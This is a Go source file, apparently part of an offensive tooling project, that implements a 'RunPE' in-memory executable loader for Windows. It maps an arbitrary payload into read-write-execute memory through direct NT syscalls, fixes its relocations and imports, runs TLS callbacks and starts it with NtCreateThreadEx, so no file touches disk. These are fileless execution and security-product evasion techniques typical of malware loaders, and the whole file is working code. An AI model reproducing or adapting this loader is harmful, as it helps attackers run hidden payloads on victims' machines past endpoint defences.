package runpe

import (
	"bytes"
	"fmt"
	"time"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/carved4/go-direct-syscall"
)

// Constants for values not provided by winapi
const (
	// Pseudo-handle for current process
	CURRENT_PROCESS = ^uintptr(0) // -1 as uintptr
)

// ntCreateSection wraps the NtCreateSection syscall.
func ntCreateSection(sizeOfImage uint32) (sectionHandle uintptr, err error) {
	var hSection uintptr
	maxSize := uint64(sizeOfImage) // NtCreateSection expects *uint64

	// Use go-direct-syscall for NtCreateSection
	status, err := winapi.NtCreateSection(
		&hSection,                         // SectionHandle (*uintptr)
		winapi.SECTION_ALL_ACCESS,         // DesiredAccess (ACCESS_MASK)
		0,                                 // ObjectAttributes (*POBJECT_ATTRIBUTES = NULL)
		&maxSize,                          // MaximumSize (*uint64)
		winapi.PAGE_EXECUTE_READWRITE,     // SectionPageProtection (ULONG)
		winapi.SEC_COMMIT,                 // AllocationAttributes (ULONG)
		0)                                 // FileHandle (HANDLE = NULL for pagefile-backed)

	if err != nil {
		return 0, fmt.Errorf("NtCreateSection failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return 0, fmt.Errorf("NtCreateSection failed with NTSTATUS: 0x%x", status)
	}
	return hSection, nil
}

// ntMapViewOfSection wraps the NtMapViewOfSection syscall with retry logic.
func ntMapViewOfSection(sectionHandle uintptr, sizeOfImage uint32) (baseAddress uintptr, err error) {
	const maxRetries = 10
	const baseDelay = 10 * time.Millisecond

	for attempt := 0; attempt < maxRetries; attempt++ {
		var bAddress uintptr
		viewSize := uintptr(sizeOfImage) // NtMapViewOfSection expects *uintptr for ViewSize

		// Small delay before each attempt (except the first)
		if attempt > 0 {
			delay := time.Duration(attempt) * baseDelay
			time.Sleep(delay)
		}

		// Use go-direct-syscall for NtMapViewOfSection
		status, err := winapi.NtMapViewOfSection(
			sectionHandle,                     // SectionHandle
			CURRENT_PROCESS,                   // ProcessHandle (GetCurrentProcess())
			&bAddress,                         // BaseAddress (*uintptr)
			0,                                 // ZeroBits (ULONG_PTR)
			0,                                 // CommitSize (SIZE_T, 0 to map entire committed section)
			nil,                               // SectionOffset (*uint64, NULL to map from beginning)
			&viewSize,                         // ViewSize (*uintptr)
			winapi.ViewShare,                  // InheritDisposition (SECTION_INHERIT)
			0,                                 // AllocationType (ULONG, 0 for MEM_COMMIT if section is SEC_COMMIT)
			winapi.PAGE_EXECUTE_READWRITE)     // Win32Protect (ULONG)

		if err != nil {
			return 0, fmt.Errorf("NtMapViewOfSection failed: %w", err)
		}
		if !winapi.IsNTStatusSuccess(status) {
			return 0, fmt.Errorf("NtMapViewOfSection failed with NTSTATUS: 0x%x", status)
		}
		
		// Success case: we got a valid base address
		if bAddress != 0 {
			return bAddress, nil
		}
		
		// If we got status success but null base address, retry
		// This can happen due to timing issues with section creation
		if attempt == maxRetries-1 {
			return 0, fmt.Errorf("NtMapViewOfSection returned NULL base address after %d attempts", maxRetries)
		}
	}
	
	return 0, fmt.Errorf("unexpected exit from retry loop")
}

func ExecuteInMemory(payload []byte) error {
	// 1. Load the PE file from memory
	reader := bytes.NewReader(payload)
	peFile, err := pe.NewFile(reader)
	if err != nil {
		return fmt.Errorf("PE parse error: %w", err)
	}

	// Validate payload size - check at least SizeOfHeaders is present
	var sizeOfHeaders uint32
	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		sizeOfHeaders = oh.SizeOfHeaders
	case *pe.OptionalHeader64:
		sizeOfHeaders = oh.SizeOfHeaders
	default:
		return fmt.Errorf("unsupported PE optional header type")
	}

	if len(payload) < int(sizeOfHeaders) {
		return fmt.Errorf("invalid payload size: %d bytes. Minimum %d bytes expected for PE headers",
			len(payload), sizeOfHeaders)
	}

	// 2. Extract important details from PE headers
	var imageBase uint64
	var sizeOfImage uint32
	var addressOfEntryPoint uint32

	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		imageBase = uint64(oh.ImageBase)
		sizeOfImage = oh.SizeOfImage
		addressOfEntryPoint = oh.AddressOfEntryPoint
	case *pe.OptionalHeader64:
		imageBase = oh.ImageBase
		sizeOfImage = oh.SizeOfImage
		addressOfEntryPoint = oh.AddressOfEntryPoint
	default:
		return fmt.Errorf("unsupported PE optional header type")
	}

	// Validate sizeOfImage to prevent OOB errors
	const MAX_REASONABLE_SIZE = 512 * 1024 * 1024 // 512 MB max
	if sizeOfImage == 0 || sizeOfImage > MAX_REASONABLE_SIZE {
		return fmt.Errorf("invalid PE image size: %d bytes", sizeOfImage)
	}

	// 3. Allocate memory for the PE image using NtCreateSection and NtMapViewOfSection
	var baseAddress uintptr
	var sectionHandle uintptr

	sectionHandle, err = ntCreateSection(sizeOfImage)
	if err != nil {
		return fmt.Errorf("ntCreateSection failed: %w", err)
	}
	// Ensure the section handle is closed when the function returns or panics
	defer func() {
		if sectionHandle != 0 {
			winapi.NtClose(sectionHandle)
		}
	}()

	baseAddress, err = ntMapViewOfSection(sectionHandle, sizeOfImage)
	if err != nil {
		// sectionHandle will be closed by the defer above
		return fmt.Errorf("ntMapViewOfSection failed: %w", err)
	}

	// Setup cleanup function for unmapping the view in case of failure before execution takes over
	// The section handle is closed by its own defer statement.
	cleanup := func() {
		if baseAddress != 0 {
			// Use NtUnmapViewOfSection instead of UnmapViewOfFile
			winapi.NtUnmapViewOfSection(CURRENT_PROCESS, baseAddress)
		}
	}

	// 4. Create memory destination slice for manipulation
	dest := unsafe.Slice((*byte)(unsafe.Pointer(baseAddress)), sizeOfImage)

	// 5. Copy PE headers
	copy(dest[:sizeOfHeaders], payload[:sizeOfHeaders])

	// 6. Copy sections to their proper virtual addresses
	// sectionsWithData := 0 // This variable is not used
	for _, section := range peFile.Sections {
		// For BSS sections, VirtualSize can be > 0 but Size == 0 (no raw data)
		// We should still process them for proper memory layout, but there's no data to copy
		// The memory was already zero-initialized by NtCreateSection(SEC_COMMIT) + NtMapViewOfSection.

		if section.VirtualSize == 0 {
			continue
		}

		if section.Size > 0 {
			sectionData, err := section.Data()
			if err != nil {
				cleanup()
				return fmt.Errorf("failed to get data for section %s: %w", section.Name, err)
			}
			va := section.VirtualAddress
			copy(dest[va:va+uint32(len(sectionData))], sectionData)
			// sectionsWithData++
		}
	}

	// 7. Apply relocations if needed
	newImageBase := uint64(baseAddress)
	if newImageBase != imageBase {
		// Revert to using the local ApplyRelocations function
		// Pass the 'dest' slice as the imageData argument
		if err := ApplyRelocations(peFile, dest, imageBase, newImageBase); err != nil {
			cleanup()
			return fmt.Errorf("relocation failed: %w", err)
		}
	}

	// 8. Resolve imports
	if err := ResolveImports(peFile, baseAddress); err != nil {
		cleanup()
		return fmt.Errorf("import resolution failed: %w", err)
	}

	// 9. Memory protections are already PAGE_EXECUTE_READWRITE for the entire section.
	// The previous VirtualProtect loop is not needed.

	// 10. Flush the instruction cache to ensure CPU doesn't execute stale instructions
	// Use NtFlushInstructionCache instead of FlushInstructionCache
	status, err := winapi.NtFlushInstructionCache(
		CURRENT_PROCESS,
		baseAddress,
		uintptr(sizeOfImage),
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtFlushInstructionCache failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtFlushInstructionCache failed with status: 0x%x", status)
	}

	// 11. Call TLS callbacks if present
	if err := ExecuteTLSCallbacks(peFile, baseAddress); err != nil {
		cleanup()
		return fmt.Errorf("TLS callback execution failed: %w", err)
	}

	// 12. Execute entry point using NtCreateThreadEx
	entryPoint := baseAddress + uintptr(addressOfEntryPoint)
	var threadHandle uintptr

	// Use NtCreateThreadEx instead of CreateThread
	status, err = winapi.NtCreateThreadEx(
		&threadHandle,                         // ThreadHandle (*uintptr)
		winapi.THREAD_ALL_ACCESS,              // DesiredAccess (THREAD_ALL_ACCESS)
		0,                                     // ObjectAttributes (NULL)
		CURRENT_PROCESS,                       // ProcessHandle
		entryPoint,                            // StartRoutine
		0,                                     // Argument (NULL)
		0,                                     // CreateFlags (0 for run immediately)
		0,                                     // ZeroBits
		0,                                     // StackSize (0 for default)
		0,                                     // MaximumStackSize (0 for default)
		0)                                     // AttributeList (NULL)

	if err != nil {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed with status: 0x%x", status)
	}
	if threadHandle == 0 {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed to create thread, handle is NULL")
	}

	defer winapi.NtClose(threadHandle) // Ensure thread handle is closed eventually

	// Wait for the thread to complete using NtWaitForSingleObject
	// If the entry point calls ExitProcess, this wait will be interrupted.
	// If the entry point is well-behaved and returns, this will allow cleanup.
	status, err = winapi.NtWaitForSingleObject(
		threadHandle,
		false, // Alertable (FALSE)
		nil)   // Timeout (NULL for infinite wait)

	if err != nil {
		// Even if NtWaitForSingleObject fails, we should attempt cleanup if possible,
		// though the state of the created thread is unknown.
		return fmt.Errorf("NtWaitForSingleObject on created thread call failed: %w", err)
	}

	if !winapi.IsNTStatusSuccess(status) {
		// This specific error indicates the function itself failed, not just a timeout or abandonment.
		return fmt.Errorf("NtWaitForSingleObject on created thread failed with status: 0x%x", status)
	}

	// If NtWaitForSingleObject returns (e.g. thread exited normally),
	// we can proceed to cleanup mapped memory.
	// If the executable called ExitProcess(), this part might not be reached.
	cleanup()
	return nil
}